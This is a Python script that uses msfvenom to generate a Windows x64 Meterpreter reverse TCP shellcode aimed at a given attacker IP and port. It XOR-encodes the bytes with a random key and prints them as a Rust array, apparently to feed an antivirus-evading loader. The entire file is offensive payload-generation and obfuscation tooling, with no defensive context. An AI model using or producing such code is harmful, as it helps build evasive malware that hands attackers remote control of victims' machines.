import os
import random
import subprocess
import sys

def generate_shellcode(ip, port):
    command = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f python"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    shellcode = ""
    for line in result.stdout.split("\n"):
        if line.startswith("buf += b\""):
            shellcode += line.split('"')[1]
    return shellcode


def encrypt_shellcode(shellcode, xor_key):
    encoded_shellcode = ""
    for c in bytearray.fromhex(shellcode.replace("\\x", "")):
        encoded_shellcode += "\\x"
        encoded_shellcode += "{:02x}".format(c ^ xor_key)
    return encoded_shellcode

def to_rust_format(shellcode):
    return shellcode.replace("\\x", ", 0x")[2:]  # Remove leading ", "

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 script.py <IP> <Port>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]

    shellcode = generate_shellcode(ip, port)
    xor_key = random.randint(0, 255)

    encrypted_shellcode = encrypt_shellcode(shellcode, xor_key)
    rust_format_shellcode = to_rust_format(encrypted_shellcode)

    print(f"XOR Key: {xor_key}")
    print(f"Shellcode Length: {len(encrypted_shellcode) // 4}")  # Each \x represents one byte
    print(f"Encrypted Shellcode in Rust Format: [{rust_format_shellcode}]")
